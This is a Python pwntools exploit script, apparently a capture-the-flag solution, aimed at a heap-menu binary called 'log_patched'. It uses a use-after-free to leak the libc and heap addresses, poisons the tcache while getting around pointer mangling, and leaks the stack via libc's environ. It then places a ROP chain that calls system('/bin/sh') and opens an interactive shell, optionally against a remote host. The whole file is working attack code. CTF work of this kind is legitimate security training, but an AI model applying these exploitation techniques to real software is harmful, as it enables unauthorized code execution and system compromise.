#!/usr/bin/python3

from pwn import *

exe = ELF("log_patched", checksec=False)
libc = ELF("libc.so.6", checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""
                # b*main+43
                b* add_request
                c
                """,
        )
        input()


info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    p = remote("172.24.92.186", 9001)
else:
    p = process(exe.path)


def malloc(size, payload):
    s(p32(0))
    sa(b">", p32(size))
    s(payload.ljust(size, b"\0"))


def show(idx):
    sa(b">", p32(1))
    s(p32(idx))
    p.recv(8)


def free(idx):
    sa(b">", p32(2))
    s(p32(idx))


malloc(0x1000, b"a" * 8)
free(0)
show(0)
p.recv(8)
libc.address = u64(p.recv(8)) - 0x219CE0
info("libc base: " + hex(libc.address))
malloc(0x1000, b"a" * 8)

malloc(0x100, b"a" * 8)
free(2)
show(2)
p.recv(8)
heap = (u64(p.recv(8)) << 12) - 0x1000
info("heap: " + hex(heap))


# 0x50
malloc(0x50, b"a" * 8)
malloc(0x50, b"a" * 8)
free(3)
free(3)

for i in range(0, 9):
    malloc(0xF0, b"a" * 8)

for i in range(0, 9):
    free(5)
malloc(0xF0, b"a" * 8)
free(13)

malloc(
    0x1A0,
    b"a" * 0xA0 + p64(0) + p64(0x101) + p64((heap + 0x2030) ^ (heap + 0x1EC0) >> 12),
)
free(15)
malloc(0xF0, b"a" * 8)
malloc(0xF0, p64(libc.sym.environ) + p64(0) * 4 + p64(0x1EFC1 - 0xA0))
show(14)
p.recv(8)
stack = u64(p.recv(8))
info("stack: " + hex(stack))
free(12)
target = stack - 8 - 0x140
malloc(
    0x1A0,
    b"a" * 0xA0 + p64(0) + p64(0x101) + p64(target ^ (heap + 0x1EC0) >> 12),
)
malloc(0xF0, b"a" * 8)
rop = ROP(libc)
GDB()
malloc(
    0xF0,
    flat(
        0,
        rop.find_gadget(["ret"]).address,
        rop.find_gadget(["pop rdi", "ret"]).address,
        next(libc.search(b"/bin/sh")),
        libc.sym.system,
    ),
)
p.interactive()
